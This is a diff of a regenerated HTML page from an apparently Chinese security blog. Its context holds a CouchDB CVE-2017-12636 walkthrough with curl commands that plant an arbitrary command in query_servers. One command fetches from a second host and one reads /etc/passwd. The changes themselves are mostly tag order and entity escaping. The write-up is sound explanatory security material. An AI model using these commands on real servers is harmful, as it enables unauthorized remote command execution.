@@ -439,12 +439,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/未授权访问/">
-                                <span class="chip bg-color">未授权访问</span>
-                            </a>
-                        
                             <a href="/tags/CouchDB/">
                                 <span class="chip bg-color">CouchDB</span>
+                            </a>
+                        
+                            <a href="/tags/未授权访问/">
+                                <span class="chip bg-color">未授权访问</span>
                             </a>
                         
                             <a href="/tags/命令执行/">
@@ -489,7 +489,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    920
+                    915
                 </div>
                 
 
@@ -530,7 +530,7 @@ python -m SimpleHTTPServer 8888
 <p>1.6.0 下</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#依次执行如下命令</span>
 curl -X PUT <span class="token string">'http://192.168.0.100:5984/_config/query_servers/cmd'</span> -d <span class="token string">'"curl http://192.168.0.105:8888/test.php"'</span> <span class="token comment" spellcheck="true"># 这里可以执行任意命令</span>
-<span class="token comment" spellcheck="true">#curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '" cat /etc/passwd &gt;&gt; tmp/ext_passwd"' </span>
+<span class="token comment" spellcheck="true">#curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '" cat /etc/passwd >> tmp/ext_passwd"' </span>
 curl -X PUT <span class="token string">'http://192.168.0.100:5984/vultest'</span>    <span class="token comment" spellcheck="true"># 添加一个Database和Document</span>
 curl -X PUT <span class="token string">'http://192.168.0.100:5984/vultest/vul'</span> -d <span class="token string">'{"_id":"770895a97726d5ca6d70a22173005c7b"}'</span>
 curl -X POST <span class="token string">'http://192.168.0.100:5984/vultest/_temp_view?limit=11'</span> -d <span class="token string">'{"language":"cmd","map":""}'</span> -H <span class="token string">'Content-Type: application/json'</span>      <span class="token comment" spellcheck="true"># 在这个Database里查询，将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行</span>
@@ -538,10 +538,10 @@ curl -X POST <span class="token string">'http://192.168.0.100:5984/vultest/_temp
 <p>2.1.0 下</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 2.1.0中修改了1.6.0用到的两个API</span>
 <span class="token comment" spellcheck="true"># Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。我们带上账号密码访问/_membership即可</span>
-curl http://<span class="token operator">&lt;</span>your-ip<span class="token operator">&gt;</span>:5984/_membership
+curl http://<span class="token operator">&lt;</span>your-ip<span class="token operator">></span>:5984/_membership
 
 <span class="token comment" spellcheck="true"># 利用(跟1.6.0类似)</span>
-curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d <span class="token string">'"id &gt;/tmp/CVE-2017-12636_is_success"'</span>
+curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d <span class="token string">'"id >/tmp/CVE-2017-12636_is_success"'</span>
 curl -X PUT <span class="token string">'http://vulhub:vulhub@your-ip:5984/vultest'</span>    <span class="token comment" spellcheck="true">#先增加一个Database和一个Document</span>
 curl -X PUT <span class="token string">'http://vulhub:vulhub@your-ip:5984/vultest/vul'</span> -d <span class="token string">'{"_id":"770895a97726d5ca6d70a22173005c7b"}'</span>
 <span class="token comment" spellcheck="true">#Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view</span>
@@ -552,7 +552,7 @@ curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d <span class
 <p>exp地址</p>
 <pre><code>https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py
 </code></pre><p><strong>nmap扫描</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5984 --script <span class="token string">"couchdb-stats.nse"</span> <span class="token operator">&lt;</span>target_ip<span class="token operator">&gt;</span>
+<pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5984 --script <span class="token string">"couchdb-stats.nse"</span> <span class="token operator">&lt;</span>target_ip<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h4><ul>
 <li>绑定指定ip</li>
@@ -639,12 +639,12 @@ curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d <span class
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/未授权访问/">
-                                    <span class="chip bg-color">未授权访问</span>
-                                </a>
-                            
                                 <a href="/tags/CouchDB/">
                                     <span class="chip bg-color">CouchDB</span>
+                                </a>
+                            
+                                <a href="/tags/未授权访问/">
+                                    <span class="chip bg-color">未授权访问</span>
                                 </a>
                             
                                 <a href="/tags/命令执行/">
@@ -889,12 +889,12 @@ curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d <span class
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Atlassian-Crowd/">
-                        <span class="chip bg-color">Atlassian Crowd</span>
-                    </a>
-                    
                     <a href="/tags/未授权访问/">
                         <span class="chip bg-color">未授权访问</span>
+                    </a>
+                    
+                    <a href="/tags/Atlassian-Crowd/">
+                        <span class="chip bg-color">Atlassian Crowd</span>
                     </a>
                     
                     <a href="/tags/远程命令执行/">
@@ -1137,7 +1137,7 @@ curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d <span class
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">358.6k</span>&nbsp;字
+                class="white-color">357.5k</span>&nbsp;字
             
             
             
